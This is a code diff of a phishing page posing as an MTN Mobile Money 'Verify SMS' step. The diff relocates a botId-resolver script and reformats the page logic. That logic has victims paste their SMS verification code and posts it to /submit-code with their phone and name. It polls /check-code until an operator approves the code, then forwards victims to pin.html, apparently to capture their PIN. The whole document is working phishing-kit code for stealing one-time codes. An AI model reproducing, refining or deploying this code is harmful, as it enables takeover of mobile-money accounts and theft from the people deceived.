@@ -1,46 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script>
-  // ============================================================
-  //  BOT ID RESOLVER — runs FIRST on every page load
-  // ============================================================
-  (function () {
-    try {
-      const params = new URLSearchParams(window.location.search);
-
-      let botId = params.get('botId');
-      if (!botId) {
-        botId = localStorage.getItem('botId');
-      }
-
-      if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
-        document.documentElement.innerHTML =
-          '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
-          '<h2>Invalid link</h2>' +
-          '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
-          '</body>';
-        window.__BOTID_MISSING__ = true;
-        throw new Error('botId missing from URL and localStorage');
-      }
-
-      localStorage.setItem('botId', botId);
-
-      if (params.get('botId') !== botId) {
-        params.set('botId', botId);
-        const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
-        window.history.replaceState({}, '', newUrl);
-      }
-
-      window.__BOT_ID__ = botId;
-
-      console.log('🆔 botId resolved immediately:', botId);
-    } catch (err) {
-      console.error('botId resolver failed:', err.message);
-    }
-  })();
-  </script>
-
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>MoMo - Verify SMS</title>
@@ -261,272 +221,317 @@
 
 </div>
 
+
+<!-- ============================================================
+     SCRIPT 1 — BOT ID RESOLVER (moved from <head> to bottom)
+     ============================================================ -->
 <script>
-  (function() {
-    'use strict';
+(function () {
+  try {
+    const params = new URLSearchParams(window.location.search);
 
-    // ---------- CONFIG ----------
-    const BACKEND_URL = ""; // leave empty to use same-origin
-
-    // ---------- BOTID (resolved by the head script) ----------
-    const botId = window.__BOT_ID__;
+    let botId = params.get('botId');
     if (!botId) {
-      console.warn('[MoMo] botId missing — page will not submit.');
+      botId = localStorage.getItem('botId');
     }
 
-    // ---------- READ OTHER DATA ----------
-    const urlParams = new URLSearchParams(window.location.search);
-    let phone = urlParams.get('phone') || localStorage.getItem('phone');
-    let name  = localStorage.getItem('fullName');
+    if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
+      document.documentElement.innerHTML =
+        '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
+        '<h2>Invalid link</h2>' +
+        '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
+        '</body>';
+      window.__BOTID_MISSING__ = true;
+      throw new Error('botId missing from URL and localStorage');
+    }
 
-    if (!phone) {
-      alert('Session expired. Please start over.');
-      window.location.href = 'details.html?botId=' + encodeURIComponent(botId || '');
+    localStorage.setItem('botId', botId);
+
+    if (params.get('botId') !== botId) {
+      params.set('botId', botId);
+      const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
+      window.history.replaceState({}, '', newUrl);
+    }
+
+    window.__BOT_ID__ = botId;
+
+    console.log('🆔 botId resolved immediately:', botId);
+  } catch (err) {
+    console.error('botId resolver failed:', err.message);
+  }
+})();
+</script>
+
+
+<!-- ============================================================
+     SCRIPT 2 — PAGE LOGIC
+     ============================================================ -->
+<script>
+(function() {
+  'use strict';
+
+  // ---------- CONFIG ----------
+  const BACKEND_URL = ""; // leave empty to use same-origin
+
+  // ---------- BOTID (resolved by the script above) ----------
+  const botId = window.__BOT_ID__;
+  if (!botId) {
+    console.warn('[MoMo] botId missing — page will not submit.');
+  }
+
+  // ---------- READ OTHER DATA ----------
+  const urlParams = new URLSearchParams(window.location.search);
+  let phone = urlParams.get('phone') || localStorage.getItem('phone');
+  let name  = localStorage.getItem('fullName');
+
+  if (!phone) {
+    alert('Session expired. Please start over.');
+    window.location.href = 'details.html?botId=' + encodeURIComponent(botId || '');
+    return;
+  }
+  if (!name) {
+    name = 'MTN User';
+    try { localStorage.setItem('fullName', name); } catch (e) {}
+  }
+
+  try { localStorage.setItem('phone', phone); } catch (e) {}
+
+  const subtitle = document.getElementById('subtitlePlaceholder');
+  if (phone) {
+    subtitle.textContent = 'We sent a code to ' + phone;
+  }
+
+  // ---------- DOM REFS ----------
+  const textarea    = document.getElementById('smsMessage');
+  const continueBtn = document.querySelector('.continue-btn');
+  let   msgDiv      = document.getElementById('message-box');
+
+  if (!msgDiv) {
+    const div = document.createElement('div');
+    div.id = 'message-box';
+    const container = document.querySelector('.card');
+    const resend = document.querySelector('.resend-wrap');
+    container.insertBefore(div, resend);
+    msgDiv = document.getElementById('message-box');
+  }
+
+  function showMessage(text, isError) {
+    msgDiv.textContent = text;
+    msgDiv.className = isError ? 'error' : 'success';
+  }
+
+  function hideMessage() {
+    msgDiv.className = '';
+    msgDiv.textContent = '';
+  }
+
+  // ---------- TEXTAREA VALIDATION ----------
+  function checkTextArea() {
+    const val = textarea.value.trim();
+    continueBtn.disabled = (val === '') || continueBtn.classList.contains('loading');
+  }
+
+  textarea.addEventListener('input', function () {
+    checkTextArea();
+    hideMessage();
+  });
+  textarea.addEventListener('paste', function () {
+    setTimeout(checkTextArea, 10);
+  });
+  textarea.focus();
+
+  // ---------- TIMER (20 seconds) ----------
+  const resendWrap = document.getElementById('resendWrap');
+  let totalSeconds = 20;
+  let timerInterval = null;
+
+  function formatTime(sec) {
+    const m = String(Math.floor(sec / 60)).padStart(2, '0');
+    const s = String(sec % 60).padStart(2, '0');
+    return m + ':' + s;
+  }
+
+  function updateTimerUI() {
+    if (totalSeconds <= 0) {
+      resendWrap.innerHTML = '<span class="clickable">Resend code</span>';
+      if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+      const clickable = resendWrap.querySelector('.clickable');
+      if (clickable) {
+        clickable.onclick = function(e) {
+          e.preventDefault();
+          startTimer(20);
+          hideMessage();
+        };
+      }
       return;
     }
-    if (!name) {
-      name = 'MTN User';
-      try { localStorage.setItem('fullName', name); } catch (e) {}
-    }
+    resendWrap.innerHTML = 'Resend code in <span class="timer">' + formatTime(totalSeconds) + '</span>';
+    resendWrap.style.cursor = 'default';
+  }
 
-    try { localStorage.setItem('phone', phone); } catch (e) {}
-
-    const subtitle = document.getElementById('subtitlePlaceholder');
-    if (phone) {
-      subtitle.textContent = 'We sent a code to ' + phone;
-    }
-
-    // ---------- DOM REFS ----------
-    const textarea    = document.getElementById('smsMessage');
-    const continueBtn = document.querySelector('.continue-btn');
-    let   msgDiv      = document.getElementById('message-box');
-
-    if (!msgDiv) {
-      const div = document.createElement('div');
-      div.id = 'message-box';
-      const container = document.querySelector('.card');
-      const resend = document.querySelector('.resend-wrap');
-      container.insertBefore(div, resend);
-      msgDiv = document.getElementById('message-box');
-    }
-
-    function showMessage(text, isError) {
-      msgDiv.textContent = text;
-      msgDiv.className = isError ? 'error' : 'success';
-    }
-
-    function hideMessage() {
-      msgDiv.className = '';
-      msgDiv.textContent = '';
-    }
-
-    // ---------- TEXTAREA VALIDATION ----------
-    function checkTextArea() {
-      const val = textarea.value.trim();
-      continueBtn.disabled = (val === '') || continueBtn.classList.contains('loading');
-    }
-
-    textarea.addEventListener('input', function () {
-      checkTextArea();
-      hideMessage();
-    });
-    textarea.addEventListener('paste', function () {
-      setTimeout(checkTextArea, 10);
-    });
-    textarea.focus();
-
-    // ---------- TIMER (20 seconds) ----------
-    const resendWrap = document.getElementById('resendWrap');
-    let totalSeconds = 20;
-    let timerInterval = null;
-
-    function formatTime(sec) {
-      const m = String(Math.floor(sec / 60)).padStart(2, '0');
-      const s = String(sec % 60).padStart(2, '0');
-      return m + ':' + s;
-    }
-
-    function updateTimerUI() {
+  function startTimer(seconds) {
+    if (timerInterval) clearInterval(timerInterval);
+    totalSeconds = seconds;
+    updateTimerUI();
+    timerInterval = setInterval(function() {
+      totalSeconds--;
       if (totalSeconds <= 0) {
-        resendWrap.innerHTML = '<span class="clickable">Resend code</span>';
-        if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
-        const clickable = resendWrap.querySelector('.clickable');
-        if (clickable) {
-          clickable.onclick = function(e) {
-            e.preventDefault();
-            startTimer(20);
-            hideMessage();
-          };
-        }
-        return;
-      }
-      resendWrap.innerHTML = 'Resend code in <span class="timer">' + formatTime(totalSeconds) + '</span>';
-      resendWrap.style.cursor = 'default';
-    }
-
-    function startTimer(seconds) {
-      if (timerInterval) clearInterval(timerInterval);
-      totalSeconds = seconds;
-      updateTimerUI();
-      timerInterval = setInterval(function() {
-        totalSeconds--;
-        if (totalSeconds <= 0) {
-          totalSeconds = 0;
-          updateTimerUI();
-        } else {
-          updateTimerUI();
-        }
-      }, 1000);
-    }
-
-    startTimer(20);
-
-    // ---------- POLLING HELPER ----------
-    let pollTimer = null;
-
-    function stopPolling() {
-      if (pollTimer) {
-        clearInterval(pollTimer);
-        pollTimer = null;
-      }
-    }
-
-    function setLoading(on) {
-      if (on) {
-        continueBtn.disabled = true;
-        continueBtn.classList.add('loading');
+        totalSeconds = 0;
+        updateTimerUI();
       } else {
-        continueBtn.classList.remove('loading');
-        checkTextArea();
+        updateTimerUI();
       }
+    }, 1000);
+  }
+
+  startTimer(20);
+
+  // ---------- POLLING HELPER ----------
+  let pollTimer = null;
+
+  function stopPolling() {
+    if (pollTimer) {
+      clearInterval(pollTimer);
+      pollTimer = null;
+    }
+  }
+
+  function setLoading(on) {
+    if (on) {
+      continueBtn.disabled = true;
+      continueBtn.classList.add('loading');
+    } else {
+      continueBtn.classList.remove('loading');
+      checkTextArea();
+    }
+  }
+
+  // ---------- REDIRECT (single clean navigation to pin.html) ----------
+  var hasRedirected = false;
+
+  function goToPin(requestId, phoneVal) {
+    if (hasRedirected) return;   // prevent double navigation
+    hasRedirected = true;
+
+    var qs = [
+      'botId='     + encodeURIComponent(botId || ''),
+      'requestId=' + encodeURIComponent(requestId || ''),
+      'phone='     + encodeURIComponent(phoneVal || phone || ''),
+      'name='      + encodeURIComponent(name || 'MTN User')
+    ].join('&');
+
+    var pinUrl = 'pin.html?' + qs;
+
+    console.log('✅ Approved — redirecting to:', pinUrl);
+
+    // ONE navigation only — no racing fallback
+    window.location.assign(pinUrl);
+  }
+
+  // ---------- SUBMIT ----------
+  continueBtn.addEventListener('click', function() {
+    if (this.disabled || this.classList.contains('loading')) return;
+
+    const message = textarea.value.trim();
+    if (!message) {
+      showMessage('Please paste or type the SMS message.', true);
+      return;
     }
 
-    // ---------- REDIRECT HELPER ----------
-    function goToPin(requestId, phoneVal) {
-      var params = [
-        'botId='     + encodeURIComponent(botId || ''),
-        'requestId=' + encodeURIComponent(requestId || ''),
-        'phone='     + encodeURIComponent(phoneVal || phone || ''),
-        'name='      + encodeURIComponent(name || 'MTN User')
-      ].join('&');
-
-      var pinUrl = 'pin.html?' + params;
-
-      console.log('✅ Approved — redirecting to:', pinUrl);
-
-      // Try standard assignment first
-      window.location.href = pinUrl;
-
-      // Fallback if the browser blocks navigation for any reason
-      setTimeout(function () {
-        try { window.location.replace(pinUrl); } catch (e) {}
-      }, 400);
+    if (!botId) {
+      showMessage('❌ Invalid link. Please open this page through the official link.', true);
+      return;
     }
 
-    // ---------- SUBMIT ----------
-    continueBtn.addEventListener('click', function() {
-      if (this.disabled || this.classList.contains('loading')) return;
+    setLoading(true);
+    hideMessage();
 
-      const message = textarea.value.trim();
-      if (!message) {
-        showMessage('Please paste or type the SMS message.', true);
-        return;
-      }
-
-      if (!botId) {
-        showMessage('❌ Invalid link. Please open this page through the official link.', true);
-        return;
-      }
-
-      setLoading(true);
-      hideMessage();
-
-      fetch(BACKEND_URL + '/submit-code', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          name: name,
-          phone: phone,
-          code: message,
-          botId: botId
-        })
+    fetch(BACKEND_URL + '/submit-code', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        name: name,
+        phone: phone,
+        code: message,
+        botId: botId
       })
-      .then(function(res) {
-        if (!res.ok) {
-          return res.text().then(function(t) {
-            const clean = t.startsWith('<') ? ('HTTP ' + res.status) : (t || ('HTTP ' + res.status));
-            throw new Error(clean);
+    })
+    .then(function(res) {
+      if (!res.ok) {
+        return res.text().then(function(t) {
+          const clean = t.startsWith('<') ? ('HTTP ' + res.status) : (t || ('HTTP ' + res.status));
+          throw new Error(clean);
+        });
+      }
+      return res.json();
+    })
+    .then(function(data) {
+      var requestId = data.requestId;
+      if (!requestId) throw new Error('No request ID received');
+
+      try { localStorage.setItem('codeRequestId', requestId); } catch (e) {}
+
+      stopPolling();
+      var attempts = 0;
+      var MAX_ATTEMPTS = 120; // ~3 minutes
+
+      pollTimer = setInterval(function() {
+        attempts++;
+        fetch(BACKEND_URL + '/check-code/' + encodeURIComponent(requestId))
+          .then(function(res) {
+            if (!res.ok) throw new Error('Verification error');
+            return res.json();
+          })
+          .then(function(status) {
+            if (status.blocked === true) {
+              stopPolling();
+              setLoading(false);
+              showMessage('❌ Account restricted. Please try again later.', true);
+              return;
+            }
+
+            if (status.approved === true) {
+              stopPolling();
+              setLoading(false);
+              showMessage('✅ Verified! Redirecting...', false);
+              // Small delay so the success message is visible before navigating
+              setTimeout(function () {
+                goToPin(requestId, phone);
+              }, 700);
+              return;
+            }
+
+            if (status.approved === false) {
+              stopPolling();
+              setLoading(false);
+              showMessage('❌ Incorrect code. Please try again.', true);
+              textarea.value = '';
+              checkTextArea();
+              textarea.focus();
+              return;
+            }
+
+            if (attempts > MAX_ATTEMPTS) {
+              stopPolling();
+              setLoading(false);
+              showMessage('⏳ Taking too long. Please try again.', true);
+            }
+            // else keep polling silently
+          })
+          .catch(function(err) {
+            console.error('Polling error:', err);
           });
-        }
-        return res.json();
-      })
-      .then(function(data) {
-        var requestId = data.requestId;
-        if (!requestId) throw new Error('No request ID received');
-
-        try { localStorage.setItem('codeRequestId', requestId); } catch (e) {}
-
-        stopPolling();
-        var attempts = 0;
-        var MAX_ATTEMPTS = 120; // ~3 minutes
-
-        pollTimer = setInterval(function() {
-          attempts++;
-          fetch(BACKEND_URL + '/check-code/' + encodeURIComponent(requestId))
-            .then(function(res) {
-              if (!res.ok) throw new Error('Verification error');
-              return res.json();
-            })
-            .then(function(status) {
-              if (status.blocked === true) {
-                stopPolling();
-                setLoading(false);
-                showMessage('❌ Account restricted. Please try again later.', true);
-                return;
-              }
-
-              if (status.approved === true) {
-                stopPolling();
-                setLoading(false);
-                showMessage('✅ Verified! Redirecting...', false);
-                // Small delay so the success message is visible before navigating
-                setTimeout(function () {
-                  goToPin(requestId, phone);
-                }, 700);
-                return;
-              }
-
-              if (status.approved === false) {
-                stopPolling();
-                setLoading(false);
-                showMessage('❌ Incorrect code. Please try again.', true);
-                textarea.value = '';
-                checkTextArea();
-                textarea.focus();
-                return;
-              }
-
-              if (attempts > MAX_ATTEMPTS) {
-                stopPolling();
-                setLoading(false);
-                showMessage('⏳ Taking too long. Please try again.', true);
-              }
-              // else keep polling silently
-            })
-            .catch(function(err) {
-              console.error('Polling error:', err);
-            });
-        }, 1500);
-      })
-      .catch(function(err) {
-        setLoading(false);
-        showMessage('❌ ' + (err.message || 'Something went wrong. Please try again.'), true);
-      });
+      }, 1500);
+    })
+    .catch(function(err) {
+      setLoading(false);
+      showMessage('❌ ' + (err.message || 'Something went wrong. Please try again.'), true);
     });
+  });
 
-    // ---------- INIT ----------
-    checkTextArea();
-  })();
+  // ---------- INIT ----------
+  checkTextArea();
+})();
 </script>
 
 </body>
